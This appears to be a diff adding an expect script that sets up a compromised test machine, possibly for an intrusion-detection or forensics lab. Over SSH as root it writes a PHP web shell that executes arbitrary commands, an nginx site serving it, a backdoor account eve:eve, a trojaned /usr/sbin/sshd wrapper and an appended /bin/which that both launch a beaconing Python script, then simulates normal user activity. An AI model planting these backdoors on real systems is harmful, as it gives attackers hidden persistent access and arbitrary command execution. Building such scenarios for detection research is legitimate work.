@@ -1,0 +1,133 @@
+#!/usr/bin/expect
+
+set host      "localhost"
+set rootpw    "root"
+set ssh_port  2022
+set http_port 8088
+set cgi_port  9099
+
+set timeout -1
+
+spawn ssh root@$host -p $ssh_port -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "$rootpw\n"
+
+# later we may assume the two packages have been installed
+#expect "#"
+#send "apt-get -y install php5-cgi nginx\n"
+
+# set backdoors
+expect "#"
+send "echo 'server {
+    listen   $http_port;
+    server_name  localhost \"\";
+    location ~ \\.php$ {
+        fastcgi_pass   127.0.0.1:$cgi_port;
+        fastcgi_param  SCRIPT_FILENAME  /var/www/nginx-default\$fastcgi_script_name;
+        include  /etc/nginx/fastcgi_params;
+    }
+}' > /etc/nginx/sites-enabled/eve\n"
+
+expect "#"
+send "echo '<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+<?php
+if (isset(\$_REQUEST\[\"cmd\"\])){
+    echo \"<pre>\";
+    \$cmd = (\$_REQUEST\[\"cmd\"\]);
+    system(\$cmd);
+    echo \"</pre>\";
+    die;
+}
+?>
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+<!--    http://michaeldaw.org   2006    -->
+' > /var/www/nginx-default/simple-backdoor.php\n"
+
+# start php-cgi
+expect "#"
+send "php-cgi -b 127.0.0.1:$cgi_port &\n"
+
+# restart nginx
+expect "#"
+send "/etc/init.d/nginx restart\n"
+
+# add eve:eve
+expect "#"
+send "useradd -m eve\n"
+expect "#"
+send "echo eve:eve | chpasswd\n"
+
+# append to /bin/which
+expect "#"
+send "if \[ -f /bin/which \]; then
+echo '/home/eve/bt.py &' >> /bin/which
+fi\n"
+
+expect "#"
+send "mv /usr/sbin/sshd /usr/sbin/sshdnew\n"
+
+expect "#"
+send "echo '#!/bin/sh
+/home/eve/bt.py &
+/usr/sbin/sshdnew \$1 \$2 \$3 \$4\n' > /usr/sbin/sshd\n"
+
+expect "# "
+send "chmod +x /usr/sbin/sshd\n"
+
+expect "#"
+send "logout\n"
+expect eof
+
+# add eve:eve
+#spawn wget -q -O /dev/null "http://$host:$http_port/simple-backdoor.php?cmd=useradd+-m+eve;+echo+eve:eve|chpasswd"
+
+spawn ssh eve@$host -p $ssh_port -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "eve\n"
+
+expect "\\$"
+send "echo '#!/usr/bin/python
+import fcntl, httplib, sys, time
+def update():
+    conn = httplib.HTTPConnection(\"www.mit.edu\")
+    try:
+        conn.request(\"GET\", \"/\")
+        print conn.getresponse().getheader(\"Date\")
+    finally:
+        conn.close()
+try:
+    f = open(\"/tmp/bt.lock\", \"w\")
+    fcntl.lockf(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
+except:
+    sys.exit(1)
+while True:
+    try:
+        update()
+    except:
+        pass
+    time.sleep(10)
+' > /home/eve/bt.py\n"
+
+expect "\\$"
+send "chmod -R a+x /home/eve\n"
+
+expect "\\$"
+send "/home/eve/bt.py &\n"
+
+expect "\\$"
+send "exit\n"
+expect eof
+
+spawn ssh alice@$host -p $ssh_port -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "alice\n"
+
+expect "\\$"
+send "wget -O faq.texi http://github.com/davidswelt/aquamacs-emacs/raw/master/doc/misc/faq.texi\n"
+
+expect "\\$"
+send "texi2pdf -b faq.texi\n"
+
+expect "\\$"
+send "exit\n"
+expect eof
